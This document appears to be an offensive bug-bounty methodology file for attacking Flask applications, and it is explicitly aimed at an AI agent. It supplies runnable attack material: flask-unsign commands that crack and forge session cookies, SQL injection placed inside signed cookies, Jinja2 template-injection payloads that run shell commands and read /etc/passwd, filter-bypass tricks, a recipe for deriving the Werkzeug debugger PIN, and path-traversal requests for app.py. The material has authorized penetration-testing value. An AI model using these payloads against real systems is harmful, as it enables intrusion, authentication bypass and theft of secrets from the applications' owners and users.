---
technology: "Flask"
kind: bug-bounty-methodology
audience: ai-agent
family: web-platforms
version: "1.0"
provenance: "corpus-grounded (writeup families: traceback/source chain; debug-check + SSTI-to-RCE; session-cookie forgery incl. SQLi-through-cookie; SSTI incl. image-borne payloads; app.py via traversal; source via SMB; Gunicorn <20.0.1 chunked smuggling; uWSGI socket RCE; --debug banners) + upstream-verified (Werkzeug debug/__init__.py (pin factors, sha3-256 on main), werkzeug changes page (SHA-1 pin through 3.1, SHA-3 lands post-3.1), Flask quickstart/deployment docs, Jinja2 sandbox docs, NVD CVE-2024-34069). Companion overview: [[flask|Flask]]."
---

# Flask bug bounty methodology

Target model: a Python web application on Flask (Werkzeug + Jinja2), either on the
development server (`Werkzeug/x.y Python/a.b` banner) or behind a WSGI server
(gunicorn/uWSGI/mod_wsgi). Authorization assumed.

Scope discipline: this file covers **Flask-specific** surface — the signed session
cookie, Jinja2 SSTI as Flask uses it, the Werkzeug debugger, Flask source/config
conventions, and the WSGI deployment edge. Generic web bugs (plain SQLi in a Flask
handler, XSS, path traversal as a class) are Phase-6 pointers unless the *framework
shape* changes the attack (e.g. SQLi delivered through a re-signed session cookie,
traversal used to fetch `app.py`).

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Werkzeug debug console | debug mode on + PIN known/derivable | PIN-gated | RCE as app user — Critical |
| Session forgery | weak/leaked SECRET_KEY | after crack | Auth bypass / priv-escalation — High–Critical |
| SSTI (render_template_string or template file control) | reflected `{{7*7}}` | often | Config leak → RCE — Critical |
| Traceback/source disclosure | debug on or verbose errors | yes | `app.py` → SECRET_KEY, hidden routes — High |
| Gunicorn <20.0.1 chunked TE | gunicorn banner <20.0.1 | yes | Request smuggling — High |
| uWSGI protocol socket exposed | uwsgi port reachable | yes | Direct RCE — Critical |
| SECRET_KEY via SSTI/`config` | SSTI confirmed | yes | Keys everything in row 2 — Critical |

## Phase 0 — Fingerprint the stack

### 0.1 The Server header is the whole stack

```bash
nmap -sV -p 5000,8000,8080 198.51.100.10
# 5000/tcp open http Werkzeug httpd 3.0.3 (Python 3.9.5)
# |_http-server-header: Werkzeug/3.0.3 Python/3.9.5   → dev server, version pin both libs
```

Interpretation (all forms seen in the field):
- `Werkzeug/x.y.z Python/a.b.c` — the **development server answered**. Debug mode may
  be on; go to Phase 3 immediately. Werkzeug version also gates the console PIN hash
  algorithm and CVE-2024-34069 (<3.0.3).
- `gunicorn/20.0.4` (nmap `http gunicorn`) — production WSGI; Werkzeug banner gone.
  Check Phase 5 (chunked-TE smuggling for <20.0.1) and fingerprint by cookie/404 instead.
- `uwsgi` / bare `nginx` fronting Python — check for a uWSGI socket exposed as TCP
  (Phase 5.2).
- No server hint, but the two signatures below still identify Flask.

### 0.2 Cookie and 404 shapes

```bash
curl -si http://198.51.100.10/ | grep -i '^set-cookie'
# Set-Cookie: session=eyJ1c2VybmFtZSI6...%3D.X-k0oQ.4jWq6bT3l1...; HttpOnly; Path=/
```

- Cookie name `session` with **three dot-separated base64 parts** (`payload.timestamp.signature`)
  is Flask's signed-cookie session. It decodes with zero secrets — do that first.
- Werkzeug 404 body is terse HTML (`<!doctype html>...404 Not Found...`) — combined
  with the cookie shape it is close to conclusive.
- `X-Powered-By` is absent; nginx in front may add its own banner — don't confuse the two.

### 0.3 First 15 minutes checklist

```bash
curl -s http://198.51.100.10/console -o /dev/null -w '%{http_code}\n'
# 404 → no debugger; 200/302-with-debug-page → Phase 3
curl -s 'http://198.51.100.10/?q={{7*7}}' ; echo     # any reflection point
curl -s http://198.51.100.10/nonexistent -o /dev/null -w '%{http_code}\n'
flask-unsign --decode --cookie 'eyJ....X.Y'          # read session fields
ls /srv/backup 2>/dev/null                            # on-box, later: find app.py
```

## Phase 1 — Session cookie attacks (the signed-cookie model)

Flask stores the session client-side: base64(payload) + timestamp + HMAC, keyed by
`SECRET_KEY`. It is **signed, never encrypted** (one observed engagement spells out the lesson).

### 1.1 Decode

```bash
flask-unsign --decode --cookie 'eyJjYXJ0X2l0ZW1zIjpbX...kifQ.Y-uqgA.abc...'
# {'cart_items': [], 'uuid': '8b1cf3cd-17b6-455d-b269-50c7ee6aeb13'}
# → the app's auth fields are now known; plan the forgery
```

(flask-session-cookie-manager3 is the alternative decoder; both are field-proven.)

### 1.2 Crack the SECRET_KEY

```bash
flask-unsign --unsign --cookie 'SESSION_VALUE' --wordlist /usr/share/wordlists/rockyou.txt
# --unsign with no wordlist uses the bundled common-secrets list (field-observed: 'secret123')
# one-off candidate: flask-unsign --unsign --cookie '...' -w <(echo 'leaked-key-here')
```

Weak keys are common on internal tools; leaked keys arrive via Phase 2 (`{{ config }}`)
or Phase 4 (app.py read). One observed chain got SECRET_KEY from SSTI, another from an
internal `/api/healthcheck` that echoed it.

### 1.3 Forge

```bash
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
# swap the cookie in the browser; enum usernames first if the field is a login name
```

One observed chain forged a cookie per username from a name list to find valid accounts;
another forged `{"username": "jack"}` from an endpoint-leaked hex key.

**SQLi-through-the-cookie** (field-observed): when the server uses a session field as a
query value, inject *inside* the signed cookie, not in a parameter:

```bash
flask-unsign --sign --cookie '{"cart_items":[],"uuid":"8b1cf3cd-...-50c7ee6aeb13'"'"' or 1=1 -- -"}' --secret 'LEAKED_KEY'
# the signature is valid (you hold the key) and the payload is the injection
# sqlmap can then target the app through a re-signing shim that runs this command per request
```

### 1.4 Code pair — what a safe session design looks like

```python
# VULNERABLE — integrity of the whole auth model rests on a guessable string
app.secret_key = "secret123"
session["user"] = request.form["username"]

# SECURE — random secret from env; server-side identity; roles never client-declared
app.secret_key = os.environ["SECRET_KEY"]     # 32+ random bytes
session["uid"] = user.id                      # server looks roles up per request
```

## Phase 2 — SSTI in Jinja2 contexts

### 2.1 Detect and identify the engine

Send `{{7*7}}` (and `${7*7}`, `<%= 7*7 %>`, `{{7*'7'}}` set) to every reflection point
— reflected username, search box, PDF/email renderer, error pages:

- `49` for `{{7*7}}` + `7777777` for `{{7*'7'}}` → **Jinja2** (observed twice in the field). Commit to the Python tree.
- `49` for both → Twig/Smarty (wrong unit).
- One observed chain: input arrives as an **image** — render the payload into a PNG with PIL
  and upload; the OCR/text-extraction path still reaches the template engine.

### 2.2 Which context

- `render_template_string(user)` — direct SSTI, textbook.
- `render_template(file)` where the **template file itself** is writable/uploadable —
  edit the template, not the parameter (field-observed: templates via SMB).
- Stored reflection — payload sits in DB and renders in admin view (observed in a
  post title and in a ticket field), which also defeats "unauthenticated" assumptions.

### 2.3 Config disclosure first, RCE second

```jinja
{{ config }}                    # full config dump incl. SECRET_KEY → Phase 1 wins
{{ config['SECRET_KEY'] }}
{{ self }}                      # template context object
```

One observed chain: SSTI → `SECRET_KEY` → forged cookie → SQLi through the cookie → admin
→ second SSTI (WAF-filtered) → blind RCE. Get the key before burning the RCE.

### 2.4 RCE payload tree (Python object graph)

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}        # enumerate reachable classes
{{ ''.__class__.__mro__[2].__subclasses__()[40]('id',shell=True).communicate() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}          # cycler trick
{{ lipsum.__globals__.os.popen('cat /etc/passwd').read() }}
```

Pick by what the context exposes (`self`, `cycler`, `lipsum`, `config`, `request`);
the goal is any path to `os`/`subprocess` globals.

### 2.5 Filtered / blind contexts (WAF between you and the engine)

Observed bypasses, in escalation order:
- blocked `_` and quotes → hex-escape inside a string: `"\x5f\x5fimport\x5f\x5f"` for
  `__import__`, then `|attr("popen")` chained filters;
- no output reflection → time-based confirm with `("sleep 11")` in the popen call;
- payload delivery as base64 decoded on-host to dodge char filters on the way in.

### 2.6 When the app *meant* to render user templates

If the product feature is user-editable templates (email/report generators), the app
should use `jinja2.sandbox.SandboxedEnvironment` — upstream docs: attribute access,
mutating methods and formatting are intercepted (`is_safe_attribute`, underscore attrs
unsafe). Test the sandbox rather than assume: `{{ ''.__class__ }}` raising
`SecurityError` means sandboxed — pivot to allowed-callable abuse and resource
exhaustion (a small template rendering huge output is still a CPU/memory DoS per the
sandbox docs' own caveats).

## Phase 3 — The Werkzeug debugger console

### 3.1 Detect

```bash
curl -s http://198.51.100.10/console -o /dev/null -w '%{http_code}\n'
# 404 → not installed; 200 → "The console is locked" page, PIN entry lives at
# /console?__debugger__=yes&cmd=... (visible in the traceback's "console" button)
```

Any unhandled 500 in debug mode returns the interactive traceback with **source
snippets and file paths** (field-observed: the traceback itself leaked
`/app/app/views.py` line numbers and a hidden `execute` route). That disclosure pays
even when the PIN never falls.

First move when a banner says Werkzeug: run a debug-check before deeper work (one
observed chain used a public exploit_werkzeug.py checker that reports `[-] Debug is not enabled`).

### 3.2 PIN anatomy (from Werkzeug source, `debug/__init__.py`)

`get_pin_and_cookie_name()` hashes, per restart-stable process:

- **probably_public_bits** = `[username, modname, appname, moddir]`
  - `username` — `getpass.getuser()` (e.g. `root`, `flask`, service account)
  - `modname` — `flask.app`
  - `appname` — `Flask` (class name attr; historically `wsgi_app` variants appear)
  - `moddir` — path of `flask/app.py` **or** the app's `app.py` (e.g. `/usr/local/lib/python3.10/site-packages/flask/app.py`)
- **private_bits** = `[str(uuid.getnode()), get_machine_id()]`
  - MAC address as decimal (`uuid.getnode()`)
  - machine-id: first of `/etc/machine-id`, else `/proc/sys/kernel/random/boot_id`,
    **plus** first line of `/proc/self/cgroup` appended (container-aware)

Digest evolution (match the banner version before computing offline):
- Werkzeug ≤ 1.x: MD5-based (rare now).
- Werkzeug 2.0 – 3.1: **SHA-1**, salted `cookiesalt` then `pinsalt`, digits sliced to 9
  (`123-456-789` format).
- Werkzeug main / 3.2+: SHA3-256 for both the pin hash and the `__wzd<...>` cookie name
  (change landed after 3.1.x; 3.1.3 source still shows `hashlib.sha1`).

Operational facts: `WERKZEUG_DEBUG_PIN=off` disables the PIN entirely (console becomes
passwordless); a wrong PIN lockout is ~10 attempts per process lifetime (3.1.3 fixed
off-by-one) — one careful shot per restart beats brute force.

### 3.3 Offline PIN calculation recipe

With any file-read/primitive on the host (Phase 4, SSRF+traversal, or same-box LFI):

```
need: getpass username | MAC of the app's interface (uuid.getnode decimal)
      /etc/machine-id (or boot_id) + /proc/self/cgroup line 1
      moddir of flask/app.py (pip show flask / python -c 'import flask;print(flask.__file__)')
then: sha1(username+modname+appname+moddir+mac+machine_id) with cookiesalt|pinsalt
      → first 9 digits → format NNN-NNN-NNN   (swap sha1→sha3-256 for 3.2+ targets)
```

Feed the PIN to `/console?__debugger__=yes&cmd=pinauth` (or the web form), then any
Python expression runs as the service user. This is the classic dev-box RCE; treat
the PIN as a speed bump, not a wall, whenever host facts are readable.

### 3.4 CVE-2024-34069 — read it correctly (NVD, verified)

Not a remote PIN bypass: the debugger's host-trust check could be satisfied via an
attacker-controlled domain/subdomain chain, letting a **crafted page** drive a
developer's browser at a debugger that is only listening on localhost, with the
developer entering the PIN (CSRF-class, CWE-352). Fixed in Werkzeug 3.0.3. Relevance:
even "localhost-only" debuggers are reachable from phishing on developer machines;
irrelevant to a server-pinned engagement target unless devs browse from it.

## Phase 4 — Source disclosure and the app.py hunt

Flask conventions make one file the crown jewel; chain any read primitive toward it:

| Vector | Observed case | What to pull |
|---|---|---|
| Path traversal in file params | observed (`/admin/view/../../..`) | `/proc/self/cmdline` (confirms Flask), then `<home>/app/app.py` |
| Exposed `.git/` | observed | full history → current `app.py`, `.vscode/settings.json` (creds/proxy) |
| Backups & archives | observed (`/var/backups/flask-app-secure.bak`) | older/alternate app versions — diff for secrets & logic |
| File shares adjacent to app host | observed (SMB) | `views.py`, templates — then **edit** them for code exec (template/pickle load) |
| Verbose tracebacks | observed | hidden routes (`/execute?cmd=`), local file paths, library versions |

Post-read checklist on `app.py`: `secret_key` → Phase 1; `debug=True` → Phase 3;
`send_file`/`os.path.join` on user input → traversal; `subprocess/os.system` on user
input → direct command injection (a field-observed hidden `execute` route); hidden routes
not linked from the UI.

## Phase 5 — The deployment edge (Werkzeug's siblings)

### 5.1 Gunicorn

- Banner `gunicorn/20.0.4` (nmap or response header) — no debugger exists; Phase 3 is out.
- **<20.0.1: chunked transfer-encoding request smuggling** (TE.TE desync against
  fronting proxies) — one observed chain read the changelog fix in 20.0.1 and smuggled
  through the front end. Version-pin from the banner before attempting.
- Config files (`gunicorn-cfg.py`, field-observed) leak bind addresses, workers, and
  sometimes env-inlined secrets.

### 5.2 uWSGI

If enumeration shows a uWSGI HTTP/socket port (or nginx `uwsgi_pass` to a reachable
socket), the **uwsgi protocol** accepts `uwsgi`-framed packets directly — including
`modifier://`-style variable injection that executes apps without the HTTP layer
(field-observed: an nginx→uWSGI-socket deployment converted to root code exec through the
protocol). Speak raw uwsgi or use the public uwsgi-RCE tooling; do not restrict to HTTP.

### 5.3 Apache mod_wsgi

`WSGIScriptAlias` (field-observed) — Flask runs under Apache; the Apache unit owns this
edge; the Flask-relevant part is that the Werkzeug banner is gone and the app user is
`www-data`. Templates and app source still pay via Phase 4.

### 5.4 Proxy trust (ProxyFix) behind nginx/HAProxy

Werkzeug's `ProxyFix` only rewrites `REMOTE_ADDR`/host/scheme if told **how many
proxies** to trust (`x_for=1`, ...). Upstream warning: trusting more proxy hops than
exist lets clients forge `X-Forwarded-For` into `request.remote_addr` — rate-limit
bypasses and IP allowlists turn client-controlled. Probe: does a forged XFF change
your apparent IP (lockout counters, logs, reflected "your IP" strings)?

## Phase 6 — Where this file hands off

- Plain SQLi/XSS/CSRF/path-traversal in handlers → generic web-app units; only the
  cookie-delivery (1.3) and app.py-targeted (Phase 4) forms are Flask-shaped.
- JWT-based auth on Flask → jwt unit.
- The WSGI front end itself (nginx config bugs, Apache) → http-proxy unit.
- Python deserialization in Celery/pickle endpoints → generic Python issues; Flask
  only supplies the HTTP doorway.

## Command quick reference

```bash
# fingerprint
nmap -sV -p 80,443,5000,8000,8080 198.51.100.10
curl -si https://example.com/ | egrep -i 'server:|set-cookie:'
# session
flask-unsign --decode --cookie 'C'
flask-unsign --unsign --cookie 'C' -w /usr/share/wordlists/rockyou.txt
flask-unsign --sign --cookie "{'uid':1,'role':'admin'}" --secret 'KEY'
# ssti
curl 'https://example.com/search?q={{7*'"'"'7'"'"'}}'
# debugger
curl -s -o /dev/null -w '%{http_code}\n' https://example.com/console
# source hunt (through any read primitive)
curl --path-as-is 'https://example.com/download?file=../../../home/svc/app/app.py'
```

## Tooling (prose)

flask-unsign is the session-cookie workhorse (decode/unsign/sign); flask-session-
cookie-manager3 decodes when flask-unsign is unavailable; sqlmap pairs with a cookie
re-signing shim for injection through sessions; hashcat/rockyou crack weak keys;
public Werkzeug console exploit scripts automate PIN+console RCE; nmap's http-server-
header probe does the initial version pin. Tools named here live in the tools vault.

## Verified CVE / bug quick table

| Bug | Versions | Class | Note |
|---|---|---|---|
| CVE-2024-34069 (Werkzeug debugger) | <3.0.3 fixed | CWE-352 CSRF against localhost debugger | developer interaction + PIN entry; not a remote PIN bypass (NVD) |
| Gunicorn chunked-TE desync | <20.0.1 fixed | request smuggling | field-observed; no CVE relied on |
| Debugger console RCE-by-design | debug mode on | PIN-gated code exec | PIN derivable offline from host facts (Phase 3.3) |
| Signed-session forgery | default design | auth bypass | only as strong as SECRET_KEY |

## References

- Werkzeug debug source (`get_pin_and_cookie_name`) and changes page — pin factors, hash evolution.
- Flask quickstart (debug mode, sessions, ProxyFix hook), deployment docs.
- Jinja2 sandbox docs — SandboxedEnvironment limits.
- NVD CVE-2024-34069 record.
- Observed engagements: 47 gated (see internal coverage ledger for the full ledger).
